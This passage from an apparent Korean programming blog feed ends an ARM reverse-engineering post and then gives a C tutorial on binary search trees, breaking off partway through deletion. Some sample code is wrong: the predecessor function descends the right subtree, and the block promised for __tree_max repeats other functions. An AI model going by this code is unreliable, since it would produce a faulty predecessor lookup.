a2-&gt;unkc-&gt;unkc[a1-&gt;unkc].unk16;</span><br><span class="line">    v6 = foo(a1-&gt;unk0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v6 == <span class="number">0x61</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v5 != <span class="number">0x61</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v6 != <span class="number">0x62</span> &amp;&amp; v5 &lt; <span class="number">0x63</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] B. Dang, A. Gazet and E. Bachaalany, “ARM,” in <em>Practical Reverse Engineering</em>. Indianapolis, IN: Wiley, 2014, pp. 39-77.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>ARM Exploitation</category>
      </categories>
  </entry>
  <entry>
    <title>이진 탐색 트리</title>
    <url>/2022/06/08/binary-search-tree/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>이진 탐색 트리의 정의와 성질을 살펴보고 구현해 보겠습니다.</p>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC%EB%9E%80" tabindex="-1">이진 탐색 트리란</h2>
<h3 id="%EC%A0%95%EC%9D%98%EC%99%80-%EC%84%B1%EC%A7%88" tabindex="-1">정의와 성질</h3>
<p>이진 탐색 트리(binary search tree)는 이진 트리면서, 다음과 같은 재귀적인 성질을 가진 트리입니다.</p>
<blockquote>
<p>노드를 기준으로 왼쪽 트리에 있는 노드들은 더 작은 키(key)를 가진다. 오른쪽 트리에 있는 노드들은 더 큰 키를 가진다.</p>
</blockquote>
<p>성질에서 알 수 있듯, 이진 탐색  트리는 키-값(key-value)의 데이터를 저장하는 자료구조입니다. 이 글에서는 편의상 키와 값은 모두 정수이며, 두 값이 같아고 가정하겠습니다. 아래 그림의 두 트리는 모두 위의 성질을 만족하는 이진 탐색 트리입니다.</p>
<p><img src="/images/binary-search-tree/1.png" alt="1.png"></p>
<p>이진 탐색 트리는 성질 상 탐색, 삽입, 삭제 등 연산의 시간 복잡도가 트리의 높이에 비례합니다. 따라서 같은 데이터를 저장하는 트리라도 형태에 따라 복잡도의 차이가 생길 수 있습니다. 그림에서 왼쪽의 경우 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>의 시간 복잡도를 갖지만, 오른쪽과 같이 비효율적인 경우 최악에는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>의 복잡도를 갖게 됩니다.</p>
<h3 id="%EA%B5%AC%EC%A1%B0%EC%B2%B4%EC%99%80-%ED%95%A8%EC%88%98-%EC%84%A0%EC%96%B8" tabindex="-1">구조체와 함수 선언</h3>
<p>자료구조 구현은 모두 C언어로 하겠습니다. 트리의 노드에 해당하는 <code>Node</code> 구조체는 키와 값을 나타내는 <code>key</code> 와 <code>value</code> , 각각 왼쪽 자식, 오른쪽 자식, 부모 노드를 가리키는 포인터 <code>left</code> , <code>right</code> , <code>parent</code> 를 멤버로 가집니다. 이진 탐색 트리를 나타내는 <code>BST</code> 구조체는 루트 노드를 가리키는 포인터 <code>root</code> 를 멤버로 가집니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> key, value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">	Node *root;</span><br><span class="line">&#125; BST;</span><br></pre></td></tr></table></figure>
<p>이진 탐색 트리의 연산을 구현하기 위한 함수들은 다음과 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 모든 노드를 키 순으로 출력합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 주어진 키를 가진 노드를 찾아 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 하나 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 하나 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 새로운 노드를 삽입합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 주어진 키를 가진 노드를 삭제합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br></pre></td></tr></table></figure>
<p>위의 함수들을 구현하기 위해 내부적으로 다음과 같은 내장 함수들을 사용합니다. 함수 이름 앞에 언더스코어(underscore) 두 개가 붙어 있으면 내장 함수로 구분하겠습니다. 이 함수들의 필요성과 쓰임에 대해서는 밑에서 하나씩 살펴볼 예정입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 노드를 기준으로 중위 순회하며 키와 값을 출력합니다.</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 하위 트리에서 주어진 키를 가진 노드를 찾아 반환합니다.</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 왼쪽 트리에서 가장 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_min(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 오른쪽 트리에서 가장 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_max(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 노드의 키보다 하나 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_predecessor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 노드의 키보다 하나 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_successor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 트리에서 노드 u의 위치에 노드 v를 대입합니다.</span></span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v);</span><br></pre></td></tr></table></figure>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84" tabindex="-1">이진 탐색 트리 구현</h2>
<h3 id="%ED%8A%B8%EB%A6%AC-%EC%88%9C%ED%9A%8C%ED%95%98%EA%B8%B0" tabindex="-1">트리 순회하기</h3>
<p>이제 제일 쉬운 함수부터 하나씩 구현해 봅시다. 가장 먼저 순회는 아주 쉬운데, 이진 트리를 중위 순회(in-order)해주면 됩니다. 이진 탐색 트리의 성질로 인해 키가 작은 노드부터 정렬된 순서로 순회하게 됩니다.</p>
<p><img src="/images/binary-search-tree/2.png" alt="2.png"></p>
<p>순회를 위한 내장 함수 <code>__tree_walk</code> 는 재귀 호출을 이용해 구현합니다. 왼쪽 트리를 재귀적으로 순회하고, 자신의 키와 값을 출력하고, 다시 오른쪽 트리를 재귀적으로 순회하는 방식입니다. 트리의 출력을 위한 <code>print</code> 함수는 루트 노드를 기준으로 순회를 수행하면 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line">	<span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__tree_walk(x-&gt;left);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">		__tree_walk(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">	__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%82%A4%EB%A5%BC-%EA%B0%80%EC%A7%84-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">키를 가진 노드 찾기</h3>
<p>다음은 탐색입니다. 탐색은 특정 키를 가진 노드를 찾는 연산으로, 사용하는 언어가 딕셔너리(dictionary), 맵(map), 연관 배열(associative array) 같은 이름의 자료구조를 지원한다면 숱하게 쓰는 연산입니다. 이진 탐색 트리는 이진 탐색을 통해 평균적으로 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간에 특정 키를 가진 노드를 찾을 수 있습니다. 아래 그림은 이진 탐색을 통해 키 <code>13</code> 을 가진 노드를 찾는 과정을 나타내고 있습니다.</p>
<p><img src="/images/binary-search-tree/3.png" alt="3.png"></p>
<p>탐색을 위한 내장 함수 <code>__tree_search</code> 는 노드 <code>x</code> 의 키와 주어진 <code>key</code> 를 반복하여 비교합니다. 주어진 <code>key</code> 가 더 크다면 <code>x</code> 의 오른쪽 자식을 <code>x</code> 에 대입하여 오른쪽 트리에서 반복을 계속합니다. <code>key</code> 가 더 작은 경우 왼쪽 트리에서 반복을 계속합니다. 반복문의 종료 조건으로 <code>x</code> 의 키와 <code>key</code> 가 일치하면 성공적으로 찾은 경우입니다. <code>x</code> 가 <code>NULL</code> 이 되는 경우는 주어진 <code>key</code> 를 찾지 못한 경우입니다.</p>
<p>탐색 연산은 일반적인 이진 탐색과 매우 유사합니다. <code>__tree_walk</code> 와 같이 재귀적으로 구현할 수도 있으나, 반복적으로 구현하는 쪽이 함수 호출과 반환에 필요한 시간과 공간을 아낄 수 있습니다. 트리에서의 탐색 연산을 위한 <code>__search</code> 함수는 루트 노드를 기준으로 탐색을 수행하면 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> __tree_search(bst-&gt;root, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>같은 원리로 가장 작은 키를 가진 노드를 반환하는 <code>__tree_min</code>, 가장 큰 키를 가진 노드를 반환하는 <code>__tree_max</code> 내장 함수도 구현할 수 있습니다. 이진 탐색 트리의 성질에 따라 왼쪽 자식만 따라가면 가장 작은 키, 오른쪽 자식만 따라가면 가장 큰 키가 나오게 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;left;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%EC%9D%B4%EC%A0%84%EA%B3%BC-%EB%8B%A4%EC%9D%8C-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">이전과 다음 노드 찾기</h3>
<p>이진 탐색 트리는 정렬된 자료구조입니다. 정렬된 자료구조에서는 특정 데이터의 이전 순서나 다음 순서의 데이터를 조회해야 하는 경우가 있습니다. 그런데 이진 탐색 트리의 성질을 활용하면, 이전 순서나 다음 순서를 찾기 위해 키를 서로 비교하지 않고도 이들 노드를 찾아낼 수 있습니다.</p>
<p>먼저 다음 순서를 찾는 연산을 보겠습니다. 다음 순서를 찾을 때는 트리의 형태에 따라 그림과 같이 두 가지 경우가 존재합니다. 그림의 왼쪽은 <code>3</code> 의 다음 노드 <code>4</code> 를 찾는 과정으로, <code>3</code> 의 오른쪽 자식이 존재하고 있습니다. 이진 탐색 트리의 성질에 따라, 오른쪽 자식이 존재하는 경우 오른쪽 트리에서 키가 최솟값인 노드를 찾으면 됩니다. 현재 노드보다 키가 큰 노드들 중에서 가장 작은 노드를 찾으면 그것이 다음 노드이기 때문입니다.</p>
<p><img src="/images/binary-search-tree/4.png" alt="4.png"></p>
<p>그림의 오른쪽은 <code>5</code> 의 다음 노드가 <code>6</code> 을 찾고 있습니다. 그런데 <code>5</code> 는 오른쪽 자식 노드가 없습니다. 이런 경우에도 자기보다 키가 작은 노드는 왼쪽 트리, 큰 노드는 오른쪽 트리에 존재한다는 성질을 이용합니다. 기준 노드의 조상 노드들을 조회하면서 기준 노드를 왼쪽 트리의 노드로 갖는 첫 번째 조상을 찾으면, 키의 비교 없이도 다음 노드를 찾을 수 있습니다. 더욱 복잡한 이 경우도 최악의 시간 복잡도가 트리의 높이에 비례하므로, 다음 노드를 찾는 연산의 시간 복잡도는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>입니다.</p>
<p>노드를 기준으로 다음 노드를 찾는 내장 함수 <code>__tree_successor</code> 는 두 경우를 구분하기 위한 분기문이 존재합니다. 4행은 오른쪽 자식이 존재하는 경우로, <code>__tree_min</code> 함수를 이용해 오른쪽 트리에서 키가 최솟값인 노드를 찾아 반환합니다. 7행은 오른쪽 자식이 없는 경우로, 이 때는 두 노드의 관계를 비교하기 위해 기준 노드 <code>x</code> 의 부모를 가리키는 포인터 <code>y</code> 를 사용합니다. <code>x</code> 는 부모 노드를 가리키는 포인터를 계속 따라가면서, <code>y</code> 가 <code>x</code> 의 부모를 가리키도록 계속 갱신합니다. 처음으로 <code>x</code> 가 <code>y</code> 의 왼쪽 자식이 되는 순간, <code>y</code> 를 반환합니다.</p>
<p>주어진 키에 대한 다음 노드를 반환하는 연산에 해당하는 <code>next</code> 함수는 앞서 구현한 내장 함수 <code>__tree_search</code> 를 이용해 주어진 키를 가진 노드를 찾습니다. 이후 해당 노드에 대해 내장 함수 <code>__tree_successor</code> 를 호출하여 다음 노드를 찾아 반환합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이전 순서를 찾을 때도 트리의 형태에 따라 두 가지 경우가 존재합니다. 다음 순서를 찾을 때와 똑같이 처리하면 됩니다. 왼쪽 자식이 있는 경우는 왼쪽 트리에서 최댓값을 반환합니다. 왼쪽 자식이 없는 경우, 조상 노드들을 조회하면서 기준 노드를 오른쪽 트리의 노드로 갖는 첫 번째 조상을 찾아야 합니다.</p>
<p><img src="/images/binary-search-tree/5.png" alt="5.png"></p>
<p>이전 노드를 찾는 내장 함수 <code>__tree_predecessor</code> 와, 주어진 키에 대한 이전 노드를 찾는 함수 <code>prev</code> 는 다음 노드를 찾는 코드와 똑같은 원리로 구현하면 됩니다. 단, 사용하는 함수가 <code>__tree_min</code> 에서 <code>__tree_max</code> 로 바뀌는 등 방향만 바꿔줍니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90-%EB%85%B8%EB%93%9C-%EC%82%BD%EC%9E%85%ED%95%98%EA%B8%B0" tabindex="-1">트리에 노드 삽입하기</h3>
<p>새로운 노드를 이진 탐색 트리에 추가하는 연산은 삽입 연산입니다. 삽입 연산은 새로운 노드를 항상 리프 노드로 추가하면 쉽게 구현할 수 있습니다. 아래 그림은 이진 탐색 트리에 새로운 키 <code>7</code> 을 가진 노드를 삽입하는 과정을 나타내고 있습니다.</p>
<p><img src="/images/binary-search-tree/6.png" alt="6.png"></p>
<p>노드를 삽입하기 위해서는, 이진 탐색을 통해 삽입할 노드를 자식으로 가질 노드를 찾아야 합니다. 삽입할 노드를 왼쪽 자식으로 가질 노드라면 기존에 왼쪽 자식이 없어야 하고, 오른쪽 자식으로 가질 노드라면 오른쪽 자식이 없어야 합니다. 그림에서는 이진 탐색을 통해 키 <code>7</code> 의 새로운 노드를 삽입할 노드를 찾습니다. 키 <code>8</code> 을 가진 노드가 왼쪽 자식이 없으면서, <code>7</code> 은 <code>8</code> 보다 작으니 해당 노드의 왼쪽 자식으로 삽입하는 것입니다. 삽입 연산의 시간 복잡도 또한 트리의 높이에 비례하므로, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>입니다.</p>
<p>삽입 연산을 구현한 <code>insert</code> 함수는 키와 값을 인자로 받고, <code>malloc</code> 함수를 통해 새로운 노드를 생성합니다. 이후 6행에서 루트 노드에서 시작하는 포인터 <code>x</code> 와, <code>x</code> 의 부모를 가리키는 포인터 <code>y</code> 를 이용하여 이진 탐색을 수행합니다. 반복문의 종료 조건은 <code>y</code> 의 자식 <code>x</code> 가 <code>NULL</code> 이 되는 것으로, 이때의 <code>x</code> 의 위치가 새로운 노드를 삽입해야 할 위치입니다. 12행에서는 주어진 키 값과 <code>y</code> 의 키 값을 비교하여, 왼쪽 자식으로 삽입할지 오른쪽 자식으로 삽입할지 결정합니다. 만약 이진 탐색 트리가 비어 있었다면 새로운 노드를 루트 노드로 설정합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">	Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">	Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		y = x;</span><br><span class="line">		x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;	<span class="comment">// 이진 탐색 트리가 비어 있는 경우</span></span><br><span class="line">		bst-&gt;root = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">		y-&gt;left = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y-&gt;right = newnode;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90%EC%84%9C-%EB%85%B8%EB%93%9C-%EC%82%AD%EC%A0%9C%ED%95%98%EA%B8%B0" tabindex="-1">트리에서 노드 삭제하기</h3>
<p>트리에서 노드를 삭제하는 연산은 구현 중 다소 까다로운 부분입니다. 항상 새로운 노드를 리프 노드로 추가하는 삽입 연산과 달리, 노드를 중간에서 삭제하게 되면 트리의 형태가 변형되기 때문입니다. 노드를 삭제할 때는 삭제할 노드가 가진 자식의 개수에 따라 경우가 나누어집니다. 아래 그림은 트리에서 키 <code>3</code> 을 가진 노드를 삭제하는 모습으로, 삭제할 노드가 자식이 아예 없거나 하나인 경우입니다.</p>
<p><img src="/images/binary-search-tree/7.png" alt="7.png"></p>
<p>그림의 경우는 비교적 단순한 경우로, 자식이 없는 경우는 단순히 삭제하면 됩니다. 자식이 하나 있는 경우는 해당 자식 노드를 삭제할 노드 위치에 대입하면, 이진 탐색 트리의 성질을 유지하면서 삭제를 수행할 수 있습니다. 사실 이 둘은 구현 상으로는 동일한 경우입니다. 자식이 없는 경우도 <code>NULL</code> 자식 노드가 있어 삭제할 위치에 <code>NULL</code> 을 대입한다고 생각하면 자식이 하나인 경우와 같은 코드로 처리할 수 있기 때문입니다.</p>
<p>반면 자식이 두 개 있는 경우는 조금 복잡합니다. 이 때는 트리에서 순서 상 다음 노드를 찾은 후, 다음 노드가 삭제할 노드의 오른쪽 자식인지 아닌지에 따라 경우가 나뉘게 됩니다. 먼저 다음 노드가 오른쪽 자식인 경우는 다음 노드를 삭제할 노드 위치에 대입합니다. 이 때 이진 탐색 트리의 성질에 의해 다음 노드는 왼쪽 자식이 없습니다. 만약 왼쪽 자식이 있으면 그쪽이 다음 노드가 되어 모순이기 때문입니다. 따라서 삭제할 노드 위치에 대입하여도, 삭제할 노드의 왼쪽 자식을 그대로 왼쪽 자식으로 가질 수 있습니다.</p>
<p><img src="/images/binary-search-tree/8.png" alt="8.png"></p>
<p>다음 노드가 삭제할 노드의 오른쪽 자식이 아닐 수도 있습니다. 이 때 삭제할 노드를 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>, 삭제할 노드의 오른쪽 자식을 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>, 삭제할 노드의 다음 노드를 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> 라고 하겠습니다. 이 경우에는 트리를 두 번 움직여 주어야 합니다. 먼저 다음 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>의 오른쪽 자식을 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> 위치에 대입합니다. 이후 <eq><span class="katex"><span class="katex-mathml"><math 